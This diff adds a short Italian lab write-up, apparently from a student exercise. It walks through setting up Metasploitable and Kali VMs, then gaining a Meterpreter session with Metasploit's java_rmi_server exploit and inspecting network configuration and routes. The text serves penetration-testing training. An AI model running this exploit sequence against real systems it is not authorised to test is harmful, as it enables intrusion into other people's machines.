@@ -1,0 +1,18 @@
+Per eseguire il progetto ho seguito queste fasi.
+1) ho configurato l'ip della metaspoitable
+   1a) [sudo loadkeys it[ (per avere la tastiera in   italiano)
+   1b) ho cambiato l'ip tramite : [sudo nano /etc/network/interfaces] ( e poi modificando l'ip)
+   1c) ho riavviato la macchina :sudo reboot
+2) ho configurato l'ip della kali : 
+    2a) ho editato la configurazione ip
+    2b) ho riavviato la macchina
+3) una volta configurato tutto : 
+   3a) eseguito da terminale :[msfconsole]
+   3b) ho fatto una ricerca sulla vulnerabilità java_rmi : [search java_rmi[
+   3c) ho usato : exploit/multi/misc/java_rmi_server , con il comando : [use 1]  o si poteva fare [use exploit/multi/misc/java_rmi_server]
+ 4) ho cercato per la configurazione il comando : [options] o si poteva con [show options]
+ 5) ho settato rhost con il comando : [rhosts ip_metasploitable]
+ 6) ho fatto partire l'exploit con il comando : [exploit]
+ 7) partita la sessione meterpreter ,ho fatto il comando :[help] , per fare una ricerca sui comandi possibili
+8 ) per avere informazioni su configruazione di rete ho fatto il comando: [ipconfig]
+9) per avere informazioni sulla tabella di routing ho usato il comando :[route]
